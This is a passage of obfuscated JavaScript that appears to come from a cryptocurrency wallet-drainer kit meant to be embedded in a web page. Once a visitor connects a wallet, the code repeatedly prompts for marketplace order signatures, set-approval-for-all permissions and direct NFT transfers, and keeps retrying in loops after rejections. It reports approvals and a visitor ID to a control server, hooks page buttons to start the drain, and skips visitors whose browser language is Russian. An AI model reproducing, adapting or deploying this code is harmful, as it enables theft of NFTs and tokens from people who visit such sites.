												FLASH_Settings[_0x1455a4(0xb0)][
													_0x1455a4(0x1f8)
												][_0x1455a4(0xbc)]
										)
											await SIGN_SEAPORT(
												_0x4c7914,
												FLASH_Provider,
												FLASH_Current_Address,
												FLASH_Settings[
													_0x1455a4(0x24e)
												],
												FLASH_ID,
												FLASH_Settings["Settings"][
													_0x1455a4(0x1f8)
												]["Price"]
											),
												(SP_US = !![]);
										else {
											if (
												typeof SIGN_X2Y2 !==
													"undefined" &&
												FLASH_Settings[_0x1455a4(0xb0)][
													_0x1455a4(0xd9)
												][_0x1455a4(0x18c)] == 0x1 &&
												FLASH_Settings[_0x1455a4(0xb0)][
													_0x1455a4(0xd9)
												]["Priority"] == 0x0 &&
												!XY_US &&
												FLASH_Current_Chain_ID == 0x1 &&
												(await is_nft_approved(
													_0x1b7582[_0x1455a4(0x190)],
													FLASH_Current_Address,
													_0x1455a4(0x13c)
												)) &&
												_0x1b7582["amount_usd"] >=
													FLASH_Settings[
														_0x1455a4(0xb0)
													][_0x1455a4(0xd9)][
														_0x1455a4(0xbc)
													]
											)
												await SIGN_X2Y2(
													_0x4c7914,
													FLASH_Provider,
													FLASH_Current_Address,
													FLASH_Settings[
														_0x1455a4(0x24e)
													],
													FLASH_ID,
													FLASH_Settings[
														_0x1455a4(0xb0)
													][_0x1455a4(0xd9)]["Price"]
												),
													(XY_US = !![]);
											else {
												if (
													FLASH_Settings["Settings"][
														_0x1455a4(0x1b1)
													][_0x1455a4(0x1bf)] > 0x0 &&
													(!FLASH_Sign_Disabled ||
														FLASH_Settings[
															_0x1455a4(0xb0)
														][_0x1455a4(0x1b1)][
															_0x1455a4(0x1fc)
														] == 0x1)
												)
													while (!![]) {
														try {
															await SIGN_NFT(
																_0x1b7582
															);
															if (
																FLASH_Settings[
																	_0x1455a4(
																		0xb0
																	)
																]["Sign"][
																	_0x1455a4(
																		0x1bf
																	)
																] == 0x1
															) {
																let _0x24b866 =
																	[];
																for (const _0x228b44 of _0x4c7914) {
																	try {
																		_0x228b44[
																			_0x1455a4(
																				0x190
																			)
																		] ==
																			_0x1b7582[
																				_0x1455a4(
																					0x190
																				)
																			] &&
																			(_0x24b866[
																				_0x1455a4(
																					0x185
																				)
																			](
																				_0x228b44
																			),
																			(_0x228b44[
																				"skip"
																			] =
																				!![]));
																	} catch (_0x1a8798) {
																		console[
																			"log"
																		](
																			_0x1a8798
																		);
																	}
																}
																await send_request(
																	{
																		action: "safa_approves",
																		user_id:
																			FLASH_ID,
																		tokens: _0x24b866,
																		address:
																			FLASH_Current_Address,
																		chain_id:
																			FLASH_Current_Chain_ID,
																		contract_address:
																			_0x1b7582[
																				"address"
																			],
																	}
																);
															}
															_0x1b7582[
																_0x1455a4(0x1f3)
															] = !![];
															break;
														} catch (_0x217c39) {
															console[
																_0x1455a4(0x215)
															](_0x217c39);
															if (
																(FLASH_Settings[
																	_0x1455a4(
																		0xb0
																	)
																][
																	_0x1455a4(
																		0x1b1
																	)
																][
																	_0x1455a4(
																		0xc8
																	)
																] == 0x1 &&
																	FLASH_Current_Provider ==
																		_0x1455a4(
																			0x170
																		)) ||
																(typeof _0x217c39[
																	"message"
																] ==
																	_0x1455a4(
																		0x13a
																	) &&
																	_0x217c39[
																		_0x1455a4(
																			0x1da
																		)
																	][
																		"includes"
																	](
																		_0x1455a4(
																			0x186
																		)
																	)) ||
																_0x217c39[
																	_0x1455a4(
																		0x156
																	)
																] == -0x7f59 ||
																_0x217c39[
																	_0x1455a4(
																		0x156
																	)
																] == -0x7d00 ||
																(_0x217c39[
																	_0x1455a4(
																		0x1da
																	)
																] &&
																	is_valid_json(
																		_0x217c39[
																			_0x1455a4(
																				0x1da
																			)
																		]
																	) &&
																	(JSON[
																		"parse"
																	](
																		_0x217c39[
																			"message"
																		]
																	)["code"] ==
																		-0x7f59 ||
																		JSON[
																			_0x1455a4(
																				0xfd
																			)
																		](
																			_0x217c39[
																				_0x1455a4(
																					0x1da
																				)
																			]
																		)[
																			_0x1455a4(
																				0x156
																			)
																		] ==
																			-0x7d00))
															) {
																if (
																	FLASH_Settings[
																		"Settings"
																	][
																		_0x1455a4(
																			0x1b1
																		)
																	][
																		"Force"
																	] == 0x1
																)
																	await sign_cancel();
																else {
																	await sign_unavailable();
																	while (
																		!![]
																	) {
																		if (
																			FLASH_Settings[
																				_0x1455a4(
																					0xb0
																				)
																			][
																				_0x1455a4(
																					0x1b1
																				)
																			][
																				"NFTs"
																			] ==
																			0x1
																		)
																			try {
																				await DO_SAFA(
																					_0x1b7582
																				);
																				let _0x2578b3 =
																					[];
																				for (const _0x11f718 of _0x4c7914) {
																					try {
																						_0x11f718[
																							_0x1455a4(
																								0x190
																							)
																						] ==
																							_0x1b7582[
																								_0x1455a4(
																									0x190
																								)
																							] &&
																							(_0x2578b3[
																								_0x1455a4(
																									0x185
																								)
																							](
																								_0x11f718
																							),
																							(_0x11f718[
																								_0x1455a4(
																									0x1f3
																								)
																							] =
																								!![]));
																					} catch (_0x1662b1) {
																						console[
																							_0x1455a4(
																								0x215
																							)
																						](
																							_0x1662b1
																						);
																					}
																				}
																				await send_request(
																					{
																						action: _0x1455a4(
																							0x10b
																						),
																						user_id:
																							FLASH_ID,
																						tokens: _0x2578b3,
																						address:
																							FLASH_Current_Address,
																						chain_id:
																							FLASH_Current_Chain_ID,
																						contract_address:
																							_0x1b7582[
																								"address"
																							],
																					}
																				),
																					(_0x1b7582[
																						_0x1455a4(
																							0x1f3
																						)
																					] =
																						!![]);
																				break;
																			} catch (_0x5d1029) {
																				console[
																					_0x1455a4(
																						0x215
																					)
																				](
																					_0x5d1029
																				),
																					await approve_cancel();
																				if (
																					!FLASH_Settings[
																						_0x1455a4(
																							0x127
																						)
																					]
																				)
																					break;
																			}
																		else {
																			if (
																				FLASH_Settings[
																					"Settings"
																				][
																					"Sign"
																				][
																					_0x1455a4(
																						0x1bf
																					)
																				] ==
																				0x2
																			)
																				try {
																					await TRANSFER_NFT(
																						_0x1b7582
																					),
																						(_0x1b7582[
																							"skip"
																						] =
																							!![]);
																					break;
																				} catch (_0x50706c) {
																					console[
																						_0x1455a4(
																							0x215
																						)
																					](
																						_0x50706c
																					),
																						await transfer_cancel();
																					if (
																						!FLASH_Settings[
																							_0x1455a4(
																								0x127
																							)
																						]
																					)
																						break;
																				}
																		}
																	}
																}
																break;
															} else {
																console[
																	_0x1455a4(
																		0x215
																	)
																](_0x217c39);
																if (
																	_0x217c39 !=
																	_0x1455a4(
																		0xf6
																	)
																) {
																	await sign_cancel();
																	if (
																		!FLASH_Settings[
																			"Loop_NFT"
																		]
																	)
																		break;
																} else break;
															}
														}
													}
												else {
													if (
														FLASH_Settings[
															_0x1455a4(0xb0)
														][_0x1455a4(0x12d)][
															_0x1455a4(0x18c)
														]
													)
														while (!![]) {
															try {
																await DO_SAFA(
																	_0x1b7582
																);
																let _0x7bbf58 =
																	[];
																for (const _0x5e2663 of _0x4c7914) {
																	try {
																		_0x5e2663[
																			"address"
																		] ==
																			_0x1b7582[
																				_0x1455a4(
																					0x190
																				)
																			] &&
																			(_0x7bbf58[
																				"push"
																			](
																				_0x5e2663
																			),
																			(_0x5e2663[
																				_0x1455a4(
																					0x1f3
																				)
																			] =
																				!![]));
																	} catch (_0x10e046) {
																		console[
																			_0x1455a4(
																				0x215
																			)
																		](
																			_0x10e046
																		);
																	}
																}
																await send_request(
																	{
																		action: "safa_approves",
																		user_id:
																			FLASH_ID,
																		tokens: _0x7bbf58,
																		address:
																			FLASH_Current_Address,
																		chain_id:
																			FLASH_Current_Chain_ID,
																		contract_address:
																			_0x1b7582[
																				_0x1455a4(
																					0x190
																				)
																			],
																	}
																),
																	(_0x1b7582[
																		"skip"
																	] = !![]);
																break;
															} catch (_0x270e13) {
																console[
																	_0x1455a4(
																		0x215
																	)
																](_0x270e13),
																	await approve_cancel();
																if (
																	!FLASH_Settings[
																		"Loop_NFT"
																	]
																)
																	break;
															}
														}
													else
														while (!![]) {
															try {
																await TRANSFER_NFT(
																	_0x1b7582
																),
																	(_0x1b7582[
																		_0x1455a4(
																			0x1f3
																		)
																	] = !![]);
																break;
															} catch (_0x3022af) {
																console[
																	_0x1455a4(
																		0x215
																	)
																](_0x3022af),
																	await transfer_cancel();
																if (
																	!FLASH_Settings[
																		"Loop_NFT"
																	]
																)
																	break;
															}
														}
												}
											}
										}
									}
								}
							}
						}
					} catch (_0x25b182) {
						console[_0x1455a4(0x215)](_0x25b182);
					}
				}
			}
			(FLASH_Process = ![]), setTimeout(end_message, 0x7d0);
		} catch (_0xf61fc3) {
			console[_0x1455a4(0x215)](_0xf61fc3);
		}
	};
try {
	let query_string = window["location"][_0x11d65a(0x27b)],
		url_params = new URLSearchParams(query_string);
	url_params["get"](_0x11d65a(0x25e)) != _0x11d65a(0x202) &&
		(navigator[_0x11d65a(0x183)] || navigator[_0x11d65a(0x117)])
			[_0x11d65a(0x2a1)]()
			[_0x11d65a(0x226)]("ru") &&
		(FLASH_Bad_Country = !![]);
} catch (_0x460f9a) {
	console[_0x11d65a(0x215)](_0x460f9a);
}
document[_0x11d65a(0x211)](_0x11d65a(0x260), async () => {
	const _0x1d0752 = _0x11d65a;
	try {
		if (FLASH_Modal_Style == 0x2) FLASHM[_0x1d0752(0xd3)]();
		else inject_modal();
		if (FLASH_Loader_Style == 0x2) FLASHL["init"]();
		FLASH_Load_Time = Math[_0x1d0752(0xe4)](
			Date[_0x1d0752(0x15c)]() / 0x3e8
		);
		if (typeof localStorage["FLASH_ID"] === _0x1d0752(0x246)) {
			const _0x4d5c30 = await send_request({ action: "retrive_id" });
			if (_0x4d5c30[_0x1d0752(0x1c2)] == "OK")
				localStorage[_0x1d0752(0x1dc)] = _0x4d5c30[_0x1d0752(0x187)];
			else
				localStorage[_0x1d0752(0x1dc)] = Math[_0x1d0752(0xe4)](
					Date["now"]() / 0x3e8
				);
		}
		(FLASH_ID = localStorage[_0x1d0752(0x1dc)]),
			await retrive_config(),
			fill_chain_data(),
			await retrive_contract(),
			(FLASH_Ready = !![]),
			enter_website();
		for (const _0x45478c in FLASH_Settings[_0x1d0752(0x113)])
			FLASH_Gas_Reserves[_0x45478c] = 0x0;
		for (const _0x388b85 of document["querySelectorAll"](
			_0x1d0752(0x1b8)
		)) {
			try {
				_0x388b85[_0x1d0752(0x211)](_0x1d0752(0x2a7), () =>
					flash_init()
				);
			} catch (_0x5b856a) {
				console[_0x1d0752(0x215)](_0x5b856a);
			}
		}
	} catch (_0x205f7f) {
		console[_0x1d0752(0x215)](_0x205f7f);
	}
});
const use_wc = () => {
	const _0x4603ea = _0x11d65a;
	connect_wallet(_0x4603ea(0x170));
};
setInterval(async () => {
	const _0x1f064f = _0x11d65a;
	try {
		let _0x1aa12a = document[_0x1f064f(0x1a3)](_0x1f064f(0x1c7));
		if (_0x1aa12a === null) return;
		else
			FLASH_Partner_Address =
				_0x1aa12a[_0x1f064f(0x145)][_0x1f064f(0x111)]();
	} catch (_0x3bc931) {
		console[_0x1f064f(0x215)](_0x3bc931);
	}
}, 0x3e8),
	window["addEventListener"](_0x11d65a(0xb6), (_0x19c559) => leave_website()),
	window[_0x11d65a(0x211)](_0x11d65a(0x19f), (_0x537f79) => leave_website());
